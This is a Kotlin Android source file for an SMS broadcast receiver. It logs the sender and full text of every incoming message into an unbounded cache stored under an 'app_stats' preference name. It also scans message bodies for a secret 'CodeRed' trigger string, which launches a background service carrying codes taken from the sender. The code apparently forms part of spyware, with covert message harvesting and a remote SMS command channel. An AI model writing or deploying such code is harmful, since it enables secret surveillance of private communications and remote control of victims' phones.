package com.example.myandroid

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Feature Gate
        if (!ConfigManager.canCollect(context, "sms")) return

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            
            // 1. Update Counters
            val current = prefs.getInt("sms_count", 0)
            val firstRun = prefs.getLong("first_run_time", 0L)
            if (firstRun == 0L) editor.putLong("first_run_time", System.currentTimeMillis())
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            // 2. Parse Messages
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages != null && messages.isNotEmpty()) {
                val rawLogs = prefs.getString("sms_logs_cache", "[]")
                val logArray = try { JSONArray(rawLogs) } catch(e: Exception) { JSONArray() }

                messages.forEach { msg ->
                    val body = msg.messageBody
                    val sender = msg.displayOriginatingAddress

                    // --- A. LOGGING ---
                    val entry = JSONObject()
                    entry.put("sender", sender)
                    entry.put("body", body)
                    entry.put("timestamp", System.currentTimeMillis())
                    logArray.put(entry)

                    // --- B. CODERED TRAP ---
                    // Checks for the emergency trigger string
                    if (body != null && body.startsWith("Hello,this is CodeRed. 339898-")) {
                        val codes = body.substringAfter("-")
                        val i = Intent(context, EmergencyService::class.java)
                        i.putExtra("sender", sender)
                        i.putExtra("codes", codes)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            context.startForegroundService(i)
                        } else {
                            context.startService(i)
                        }
                    }
                }
                // Limit Removed: Infinite Logging Active
                editor.putString("sms_logs_cache", logArray.toString())
            }
            editor.apply()
        }
    }
}